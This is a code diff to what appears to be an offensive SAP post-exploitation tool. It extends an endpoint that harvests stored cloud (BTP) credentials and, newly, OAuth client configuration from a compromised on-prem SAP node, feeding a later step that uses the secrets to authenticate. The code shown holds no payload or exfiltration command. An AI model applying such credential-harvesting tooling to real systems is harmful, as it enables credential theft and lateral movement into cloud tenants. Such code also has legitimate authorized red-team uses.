@@ -3011,15 +3011,35 @@ def create_app(api: SAPMAPApi) -> Bottle:
     def node_harvest_btp_creds(sid):
         """Scan a pwned on-prem node for stored BTP-bound credentials
         (SM59 destinations to *.hana.ondemand.com, ABAP RSECTAB
-        entries, Java SecStoreFS rows).  Returns the candidates
-        directly — minting is a separate, explicit step (operator
-        picks which secret to exchange so accidental authentication
+        entries, Java SecStoreFS rows, OA2C OAuth client config).
+
+        Implicit OA2C refresh: every harvest run also re-reads
+        transaction OA2C_CONFIG's tables (OA2C_CLIENT + EXT) so the
+        operator's single click guarantees node.oauth2_profiles is
+        up to date before the matcher runs.  This used to be a
+        separate "Read OA2C OAuth Profiles" data-extraction action;
+        nobody wanted to think about ordering it correctly, and the
+        only thing it produces is harvester input.
+
+        Minting is still a separate, explicit step (operator picks
+        which secret to exchange so accidental authentication
         attempts don't fan out)."""
         from sap_onprem_to_btp import harvest_btp_candidates
+        from sap_oa2c import read_oa2c_profiles
         response.content_type = "application/json"
         node = api.state.get_node(sid)
         if not node:
             return json.dumps({"error": f"Node {sid} not found"})
+        is_abap = "ABAP" in (node.system_type or "").upper()
+        if is_abap:
+            try:
+                profiles = read_oa2c_profiles(node)
+                node.oauth2_profiles = profiles
+            except Exception as e:
+                print(f"[-] {sid}: implicit OA2C read failed — {e!s}.  "
+                      f"Continuing harvest with existing "
+                      f"node.oauth2_profiles ({len(node.oauth2_profiles or [])} "
+                      f"row(s)).")
         cands = harvest_btp_candidates(api.state, node)
         print(f"[*] {sid}: harvested {len(cands)} BTP credential "
               f"candidate(s) from existing captures")
